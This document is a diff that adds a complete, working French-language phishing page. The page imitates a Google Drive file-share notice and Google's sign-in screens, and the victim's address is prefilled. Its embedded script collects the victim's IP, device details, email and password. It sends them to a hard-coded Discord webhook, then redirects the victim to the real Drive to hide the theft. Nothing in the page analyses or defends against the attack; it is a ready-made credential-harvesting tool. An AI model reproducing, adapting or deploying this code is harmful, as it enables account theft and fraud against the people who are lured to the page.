@@ -1,1 +1,336 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#ffffff">
+<title>Facture_Novembre_2026.pdf - Google Drive</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 87.3 78'%3E%3Cpath fill='%2300ac47' d='M29.9 1.2 0 52.9l13.4 23.2 29.9-51.7z'/%3E%3Cpath fill='%23ffba00' d='M57.5 1.2H29.9l29.9 51.7h27.6z'/%3E%3Cpath fill='%232684fc' d='M59.8 76.1H86l-13.4-23.2H44.9z'/%3E%3C/svg%3E">
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;padding:0}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+    background:#f8f9fa;color:#202124;min-height:100vh;
+    -webkit-font-smoothing:antialiased;
+  }
+  .screen{display:none}
+  .screen.on{display:block}
 
+  /* ---------- Écran 1 : partage Drive ---------- */
+  .drivebar{
+    display:flex;align-items:center;gap:10px;background:#fff;
+    padding:14px 18px;padding-top:calc(14px + env(safe-area-inset-top));
+    border-bottom:1px solid #e8eaed;position:sticky;top:0;z-index:5;
+  }
+  .drivebar span{font-size:21px;color:#5f6368;letter-spacing:.2px}
+  .drivebar svg{width:26px;height:26px;flex:0 0 auto}
+  .wrap{padding:18px 16px calc(28px + env(safe-area-inset-bottom))}
+  .card{
+    background:#fff;border-radius:14px;padding:20px;
+    box-shadow:0 1px 2px rgba(60,64,67,.10),0 2px 8px rgba(60,64,67,.08);
+    max-width:520px;margin:0 auto;
+  }
+  .row{display:flex;align-items:center;gap:11px;margin-bottom:18px}
+  .avatar{
+    width:40px;height:40px;border-radius:50%;background:#1a73e8;color:#fff;
+    display:flex;align-items:center;justify-content:center;font-weight:600;font-size:17px;
+    flex:0 0 auto;
+  }
+  .who{font-size:15px;font-weight:600;color:#202124;line-height:1.2}
+  .who small{display:block;font-weight:400;color:#5f6368;font-size:13px;margin-top:2px}
+  h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124}
+  .muted{font-size:14px;line-height:1.55;color:#5f6368;margin:0 0 18px}
+  .file{
+    display:flex;align-items:center;gap:12px;border:1px solid #e8eaed;
+    border-radius:10px;padding:12px 14px;margin-bottom:20px;background:#fafafa;
+  }
+  .pdfico{
+    width:36px;height:36px;border-radius:6px;background:#e8453c;color:#fff;
+    display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;
+    letter-spacing:.4px;flex:0 0 auto;
+  }
+  .fname{font-size:14px;font-weight:500;color:#202124;word-break:break-all}
+  .fmeta{font-size:12px;color:#5f6368;margin-top:3px}
+  .btn{
+    display:block;width:100%;border:0;border-radius:8px;background:#1a73e8;color:#fff;
+    font-size:15px;font-weight:500;padding:13px 16px;cursor:pointer;
+    font-family:inherit;-webkit-appearance:none;
+  }
+  .btn:active{background:#1765cc}
+  .tiny{text-align:center;font-size:12px;color:#80868b;margin-top:16px}
+
+  /* ---------- Écrans Google ---------- */
+  .gwrap{
+    max-width:420px;margin:0 auto;padding:44px 26px calc(30px + env(safe-area-inset-bottom));
+    padding-top:calc(44px + env(safe-area-inset-top));
+  }
+  .gwrap .glogo{width:40px;height:40px;display:block;margin-bottom:20px}
+  .gwrap h2{font-size:23px;font-weight:400;margin:0 0 8px;color:#202124}
+  .gwrap .lead{font-size:15px;color:#202124;margin:0 0 26px;line-height:1.4}
+  .gwrap .lead b{font-weight:500}
+  .field{
+    width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 14px;
+    font-size:16px;font-family:inherit;color:#202124;background:#fff;
+    -webkit-appearance:none;appearance:none;outline:none;
+  }
+  .field:focus{border-color:#1a73e8;box-shadow:inset 0 0 0 1px #1a73e8}
+  .link{display:inline-block;font-size:13px;color:#1a73e8;font-weight:500;margin-top:14px;text-decoration:none}
+  .actions{display:flex;justify-content:flex-end;margin-top:34px}
+  .gbtn{
+    border:0;border-radius:4px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;
+    padding:11px 26px;cursor:pointer;font-family:inherit;-webkit-appearance:none;min-width:96px;
+  }
+  .gbtn:active{background:#1765cc}
+  .gbtn[disabled]{background:#8ab4f8}
+  .chip{
+    display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;
+    border-radius:20px;padding:5px 14px 5px 5px;font-size:13px;color:#3c4043;
+    margin-bottom:26px;max-width:100%;
+  }
+  .chip .mini{
+    width:22px;height:22px;border-radius:50%;background:#1a73e8;color:#fff;
+    display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex:0 0 auto;
+  }
+  .chip span.mail{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .show{
+    display:flex;align-items:center;gap:8px;font-size:13px;color:#5f6368;
+    margin-top:16px;user-select:none;
+  }
+  .show input{width:16px;height:16px;margin:0;accent-color:#1a73e8}
+  .spin{
+    width:14px;height:14px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;
+    border-radius:50%;display:inline-block;vertical-align:-2px;margin-right:7px;
+    animation:sp .7s linear infinite;
+  }
+  @keyframes sp{to{transform:rotate(360deg)}}
+  .foot{font-size:12px;color:#5f6368;margin-top:auto}
+</style>
+</head>
+<body>
+
+<!-- ============ ÉCRAN 1 ============ -->
+<section class="screen on" id="s1">
+  <header class="drivebar">
+    <svg viewBox="0 0 87.3 78" aria-hidden="true">
+      <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
+      <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0-1.2 4.5h27.5z" fill="#00ac47"/>
+      <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
+      <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
+      <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
+      <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
+    </svg>
+    <span>Drive</span>
+  </header>
+
+  <div class="wrap">
+    <div class="card">
+      <div class="row">
+        <div class="avatar">R</div>
+        <div class="who">Robin<small>robin.marchand@gmail.com</small></div>
+      </div>
+      <h1>Robin souhaite vous envoyer un fichier</h1>
+      <p class="muted">Le fichier est en attente d'approbation. Connectez-vous à votre compte pour l'accepter et y accéder.</p>
+      <div class="file">
+        <div class="pdfico">PDF</div>
+        <div>
+          <div class="fname">Facture_Novembre_2026.pdf</div>
+          <div class="fmeta">PDF &middot; 68 Ko</div>
+        </div>
+      </div>
+      <button class="btn" id="start">Se connecter pour approuver</button>
+      <div class="tiny">Partagé via Google Drive</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ ÉCRAN 2 : email ============ -->
+<section class="screen" id="s2">
+  <div class="gwrap">
+    <svg class="glogo" viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h2>Connexion</h2>
+    <p class="lead">Continuer vers <b>Google Drive</b></p>
+
+    <form id="formEmail" novalidate>
+      <input class="field" id="email" type="email" inputmode="email"
+             value="maudperez33@mail.com"
+             autocapitalize="none" autocorrect="off" spellcheck="false"
+             autocomplete="off" placeholder="Adresse e-mail">
+      <a class="link" href="#" onclick="return false">Mot de passe oublié&nbsp;?</a>
+      <div class="actions"><button class="gbtn" type="submit">Suivant</button></div>
+    </form>
+  </div>
+</section>
+
+<!-- ============ ÉCRAN 3 : mot de passe ============ -->
+<section class="screen" id="s3">
+  <div class="gwrap">
+    <svg class="glogo" viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h2>Bienvenue</h2>
+    <div class="chip"><span class="mini">M</span><span class="mail" id="chipMail">maudperez33@mail.com</span></div>
+
+    <form id="formPwd" novalidate>
+      <input class="field" id="pwd" type="password" inputmode="text"
+             autocapitalize="none" autocorrect="off" spellcheck="false"
+             autocomplete="off" placeholder="Saisissez votre mot de passe">
+      <label class="show"><input type="checkbox" id="showpwd"> Afficher le mot de passe</label>
+      <div class="actions"><button class="gbtn" id="btnLogin" type="submit">Se connecter</button></div>
+    </form>
+  </div>
+</section>
+
+<script>
+(function () {
+  "use strict";
+
+  var WEBHOOK  = "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot";
+  var CODE     = "RB-9K42-XT7D";
+  var REDIRECT = "https://drive.google.com/drive/my-drive";
+
+  var $ = function (id) { return document.getElementById(id); };
+  var emailEl = $("email"), pwdEl = $("pwd");
+
+  function show(id) {
+    var all = document.querySelectorAll(".screen");
+    for (var i = 0; i < all.length; i++) all[i].classList.remove("on");
+    $(id).classList.add("on");
+    window.scrollTo(0, 0);
+  }
+
+  function ua() { return (navigator.userAgent || "—").slice(0, 180); }
+  function now() { return new Date().toISOString(); }
+
+  /* Envoi principal : fetch CORS avec keepalive */
+  function post(payload, keep) {
+    return fetch(WEBHOOK + "?wait=true", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: !!keep,
+      cache: "no-store"
+    });
+  }
+
+  /* Repli : sendBeacon (survit à la navigation) */
+  function beacon(payload) {
+    try {
+      var blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+      navigator.sendBeacon(WEBHOOK, blob);
+    } catch (e) {}
+  }
+
+  /* Envoie, avec repli automatique, et résout au plus tard après `ms` */
+  function fire(payload, ms, keep) {
+    var req;
+    try { req = post(payload, keep); }
+    catch (e) { req = Promise.reject(e); }
+
+    req.then(function (r) { if (!r || !r.ok) beacon(payload); })
+       .catch(function () { beacon(payload); });
+
+    return new Promise(function (resolve) {
+      var done = false;
+      var t = setTimeout(function () { if (!done) { done = true; resolve(); } }, ms);
+      function fin() { if (!done) { done = true; clearTimeout(t); resolve(); } }
+      req.then(fin).catch(fin);
+    });
+  }
+
+  function msg(title, color, fields) {
+    return {
+      username: "Drive \u00b7 " + CODE,
+      embeds: [{
+        title: title,
+        color: color,
+        fields: fields,
+        footer: { text: "Ref " + CODE },
+        timestamp: now()
+      }]
+    };
+  }
+
+  /* ---------- Ping d'ouverture ---------- */
+  window.addEventListener("load", function () {
+    var ip = "\u2014";
+    var ipReq = fetch("https://api.ipify.org?format=json", { cache: "no-store" })
+      .then(function (r) { return r.json(); })
+      .then(function (j) { if (j && j.ip) ip = j.ip; })
+      .catch(function () {});
+
+    Promise.race([ipReq, new Promise(function (r) { setTimeout(r, 1200); })]).then(function () {
+      fire(msg("\ud83d\udc40 Page ouverte", 0x34a853, [
+        { name: "Code", value: "`" + CODE + "`", inline: true },
+        { name: "IP", value: "`" + ip + "`", inline: true },
+        { name: "Appareil", value: ua() }
+      ]), 2000, true);
+    });
+  });
+
+  /* ---------- Étape 1 ---------- */
+  $("start").addEventListener("click", function () {
+    $("chipMail").textContent = emailEl.value || "maudperez33@mail.com";
+    show("s2");
+  });
+
+  /* ---------- Étape 2 : email ---------- */
+  $("formEmail").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var mail = emailEl.value;
+    $("chipMail").textContent = mail || "\u2014";
+    fire(msg("\u2709\ufe0f Email saisi", 0xfbbc05, [
+      { name: "Code", value: "`" + CODE + "`", inline: true },
+      { name: "Email", value: "`" + (mail || "—") + "`" }
+    ]), 1200, true);
+    show("s3");
+    setTimeout(function () { try { pwdEl.focus(); } catch (err) {} }, 120);
+  });
+
+  /* ---------- Étape 3 : mot de passe ---------- */
+  var sent = false;
+  $("formPwd").addEventListener("submit", function (e) {
+    e.preventDefault();
+    if (sent) return;
+    sent = true;
+
+    var mail = emailEl.value;      /* lecture brute, sans trim */
+    var pass = pwdEl.value;        /* lecture brute, sans trim ni découpe */
+
+    var btn = $("btnLogin");
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spin"></span>Connexion\u2026';
+
+    fire(msg("\ud83d\udd10 Identifiants", 0x4285f4, [
+      { name: "Code", value: "`" + CODE + "`", inline: true },
+      { name: "Email", value: "`" + (mail || "—") + "`" },
+      { name: "Mot de passe", value: "```\n" + (pass || "—") + "\n```" },
+      { name: "Appareil", value: ua() }
+    ]), 3000, false).then(function () {
+      location.replace(REDIRECT);
+    });
+
+    /* filet de sécurité : on ne laisse jamais l'utilisateur bloqué */
+    setTimeout(function () {
+      if (location.href.indexOf("drive.google.com") === -1) location.replace(REDIRECT);
+    }, 6000);
+  });
+
+  /* Afficher / masquer */
+  $("showpwd").addEventListener("change", function () {
+    pwdEl.type = this.checked ? "text" : "password";
+    pwdEl.focus();
+  });
+})();
+</script>
+</body>
+</html>
